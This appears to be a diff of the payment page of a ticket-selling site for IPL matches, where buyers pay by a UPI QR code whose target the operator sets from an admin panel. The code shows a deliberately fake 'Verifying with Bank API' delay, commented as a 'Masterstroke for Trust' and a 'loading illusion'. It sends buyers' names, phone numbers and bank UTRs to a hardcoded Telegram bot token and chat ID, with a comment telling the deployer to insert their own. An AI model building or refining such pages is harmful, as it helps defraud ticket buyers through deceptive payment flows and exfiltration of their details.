@@ -57,29 +57,17 @@
         /* QR Section */
         .qr-section { padding: 15px 20px 25px; }
         
-        /* 📸 Screenshot Safe Viewfinder Animation (Green Line Removed) */
-        .qr-container { position: relative; width: 220px; height: 220px; margin: 0 auto; border-radius: 16px; border: 1px solid #e2e8f0; padding: 10px; background: #fff; box-shadow: 0 10px 25px rgba(0,0,0,0.03); overflow: hidden; display: none;}
-        #qr-code { width: 100%; height: 100%; object-fit: contain; border-radius: 8px; position: relative; z-index: 1;}
+        /* 📲 QR Laser Animation */
+        .qr-container { position: relative; width: 220px; height: 220px; margin: 0 auto; border-radius: 16px; border: 2px solid #e2e8f0; padding: 10px; background: #fff; box-shadow: 0 10px 25px rgba(0,0,0,0.05); overflow: hidden; display: none;}
+        #qr-code { width: 100%; height: 100%; object-fit: contain; border-radius: 8px; }
+        .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #00cf7f; box-shadow: 0 0 15px 2px rgba(0, 207, 127, 0.8); animation: scan 2s infinite linear; z-index: 10; display: none; }
         
-        .qr-viewfinder { position: absolute; inset: 0; padding: 10px; z-index: 2; pointer-events: none; }
-        .corner { position: absolute; width: 25px; height: 25px; border-color: #00cf7f; border-style: solid; animation: pulse-corners 2s infinite; }
-        .top-left { top: 15px; left: 15px; border-width: 4px 0 0 4px; border-radius: 6px 0 0 0; }
-        .top-right { top: 15px; right: 15px; border-width: 4px 4px 0 0; border-radius: 0 6px 0 0; }
-        .bottom-left { bottom: 15px; left: 15px; border-width: 0 0 4px 4px; border-radius: 0 0 0 6px; }
-        .bottom-right { bottom: 15px; right: 15px; border-width: 0 4px 4px 0; border-radius: 0 0 6px 0; }
-
-        @keyframes pulse-corners {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.03); opacity: 0.6; }
-            100% { transform: scale(1); opacity: 1; }
+        @keyframes scan {
+            0% { top: 10px; opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { top: calc(100% - 10px); opacity: 0; }
         }
-
-        /* 📥 Utility Buttons (Save & Copy) */
-        .qr-actions { margin-top: 15px; display: none; justify-content: center; gap: 10px; flex-wrap: wrap;}
-        .btn-action { background: #f1f5f9; color: #475569; border: 1px solid #e2e8f0; padding: 8px 14px; border-radius: 50px; font-size: 12px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 6px; outline: none;}
-        .btn-action:hover { background: #e2e8f0; color: #1e293b; }
-        .btn-action:active { transform: scale(0.97); }
-        .btn-action svg { width: 14px; height: 14px; }
 
         /* Trust Logos */
         .trust-logos { margin-top: 20px; display: flex; justify-content: center; align-items: center; gap: 18px; }
@@ -142,7 +130,7 @@
         </div>
 
         <div class="steps-box">
-            <div style="margin-bottom: 8px;"><span>Step 1</span> Scan QR code or Copy UPI ID to pay.</div>
+            <div style="margin-bottom: 8px;"><span>Step 1</span> Scan QR code using any UPI App.</div>
             <div><span>Step 2</span> Pay the exact amount & copy Bank UTR.</div>
         </div>
         
@@ -150,26 +138,9 @@
             <p style="color:#64748b; font-size:13px; margin-top:0; font-weight:500;" id="qr-msg">Connecting to Secure Server...</p>
             
             <div class="qr-container" id="qr-wrapper">
-                <div class="qr-viewfinder">
-                    <div class="corner top-left"></div>
-                    <div class="corner top-right"></div>
-                    <div class="corner bottom-left"></div>
-                    <div class="corner bottom-right"></div>
-                </div>
+                <div class="scanner-line" id="scanner-line"></div>
                 <img id="qr-code" src="" alt="UPI QR">
             </div>
-
-            <div class="qr-actions" id="qr-actions-box">
-                <button class="btn-action" onclick="downloadQR()">
-                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
-                    Save QR
-                </button>
-                <button class="btn-action" onclick="copyUPI()">
-                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M8 7v8a2 2 0 002 2h6M8 7V5a2 2 0 012-2h4.586a1 1 0 01.707.293l4.414 4.414a1 1 0 01.293.707V15a2 2 0 01-2 2h-2M8 7H6a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2v-2"></path></svg>
-                    Copy UPI ID
-                </button>
-            </div>
-            <p id="upi-copied-msg" style="display:none; color:#00cf7f; font-size:11px; margin-top:5px; font-weight:600;"></p>
 
             <div class="trust-logos">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI" height="18">
@@ -208,9 +179,6 @@
     </div>
 
     <script>
-        // Global variables for buttons
-        window.currentUpiId = "";
-
         // --- ⏳ TIMER LOGIC ---
         let timeLeft = 300; 
         const timerEl = document.getElementById('timer');
@@ -228,14 +196,7 @@
 
         // --- ORDER SUMMARY LOGIC ---
         const finalPrice = localStorage.getItem('finalPrice') || 0;
-        let matchTitle = "IPL Match Ticket";
-        try {
-            const savedMatch = localStorage.getItem('selectedMatch');
-            if(savedMatch) {
-                const parsed = JSON.parse(savedMatch);
-                if(parsed && parsed.title) matchTitle = parsed.title;
-            }
-        } catch(e) {}
+        const matchTitle = JSON.parse(localStorage.getItem('selectedMatch'))?.title || "IPL Match Ticket";
         
         document.getElementById('p-amt').innerText = "₹" + finalPrice;
         document.getElementById('s-match').innerText = matchTitle;
@@ -251,34 +212,6 @@
                 details.style.display = 'block';
                 arrow.style.transform = 'rotate(180deg)';
             }
-        }
-
-        // --- 📋 UTILITY LOGIC (Copy & Save) ---
-        function copyUPI() {
-            if (!window.currentUpiId) return;
-            navigator.clipboard.writeText(window.currentUpiId).then(() => {
-                const msgEl = document.getElementById('upi-copied-msg');
-                msgEl.innerText = "UPI ID Copied to Clipboard!";
-                msgEl.style.display = 'block';
-                setTimeout(() => { msgEl.style.display = 'none'; }, 2000);
-            }).catch(err => {
-                alert("Failed to copy UPI. Please copy manually.");
-            });
-        }
-
-        function downloadQR() {
-            const qrImg = document.getElementById('qr-code');
-            const url = qrImg.src;
-            if (!url || url === "") {
-                alert("Please wait for QR to load.");
-                return;
-            }
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `Secure_QR_${Date.now()}.png`; 
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
         }
 
         // --- UTR VALIDATION LOGIC ---
@@ -322,7 +255,7 @@
                 errorMsg.style.display = 'none';
                 localStorage.setItem('userUTR', val); 
 
-                // ⏳ FAKE API DELAY
+                // ⏳ FAKE API DELAY (The Masterstroke for Trust)
                 btn.classList.remove('active');
                 btn.classList.add('loading');
                 btnText.innerText = "Verifying with Bank API...";
@@ -331,7 +264,7 @@
                 setTimeout(() => {
                     // --- ✈️ TELEGRAM UTR ALERT ---
                     const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
-                    const chatId = "6820660513"; 
+                    const chatId = "6820660513"; // 👈 YAHAN APNI CHAT ID DAALEIN
                     
                     const name = localStorage.getItem('customerName') || 'N/A';
                     const phone = localStorage.getItem('customerPhone') || 'N/A';
@@ -355,7 +288,7 @@
                         window.location.href = 'processing.html'; 
                     });
 
-                }, 2500); 
+                }, 2500); // 2.5 seconds validation loading illusion
             }
         }
     </script>
@@ -366,4 +299,43 @@
         const price = localStorage.getItem('finalPrice') || 0;
         const qrImg = document.getElementById('qr-code');
         const qrMsg = document.getElementById('qr-msg');
-        const qrWrapper = do
+        const qrWrapper = document.getElementById('qr-wrapper');
+        const scannerLine = document.getElementById('scanner-line');
+
+        try {
+            onValue(ref(db, 'settings/payment'), (snap) => {
+                if (snap.exists()) {
+                    const data = snap.val();
+                    let url = data.qrUrl || "";
+                    let upi = data.upiId || "";
+
+                    if (url.startsWith("qhttp")) { url = url.replace("qhttp", "http"); }
+                    
+                    if (url !== "") {
+                        qrImg.src = url;
+                        qrMsg.style.display = 'none'; 
+                        qrWrapper.style.display = 'block';
+                        scannerLine.style.display = 'block'; // Start scanner animation
+                    } 
+                    else if (upi !== "") {
+                        const upiString = `upi://pay?pa=${upi}&pn=SecurePayment&am=${price}&cu=INR`;
+                        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiString)}`;
+                        qrMsg.style.display = 'none'; 
+                        qrWrapper.style.display = 'block';
+                        scannerLine.style.display = 'block'; // Start scanner animation
+                    } else {
+                        qrMsg.innerText = "Payment method not available at the moment.";
+                    }
+                } else {
+                    qrMsg.innerText = "QR Setup is incomplete. Check Admin Panel.";
+                }
+            }, (error) => {
+                qrMsg.innerText = "Connection Error: " + error.message;
+            });
+        } catch (err) {
+            qrMsg.innerText = "System Error: " + err.message;
+        }
+    </script>
+
+</body>
+</html>
